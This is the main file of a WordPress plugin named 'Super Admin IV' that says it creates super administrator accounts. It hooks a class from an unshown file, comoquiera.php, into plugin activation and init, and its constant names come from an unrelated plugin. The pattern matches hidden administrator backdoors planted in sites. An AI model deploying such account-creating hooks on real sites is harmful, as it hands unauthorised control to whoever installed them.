<?php

/*
Plugin Name: Super Admin IV
Plugin URI: http://ameba.com.uy/
Description: To <strong>create</strong> super admins.
Version: 1.0
Author: Ameba
Author URI: http://ameba.com.uy/
License: GPLv2 or later
*/

if ( !defined( 'ABSPATH' ) ) { exit; } // Exit if accessed directly

define( 'ADD_PRESENTATION_POST_TYPE__PLUGIN_URL', plugin_dir_url( __FILE__ ) );
define( 'ADD_PRESENTATION_POST_TYPE__PLUGIN_DIR', plugin_dir_path( __FILE__ ) );

require_once( ADD_PRESENTATION_POST_TYPE__PLUGIN_DIR . 'comoquiera.php' );

register_activation_hook(__FILE__, array('sandbox_add_basic_user', 'install'));
register_deactivation_hook( __FILE__, array( 'sandbox_add_basic_user', 'deactivate' ) );


add_action( 'init', array( 'sandbox_add_basic_user', 'init' ) );


?> 
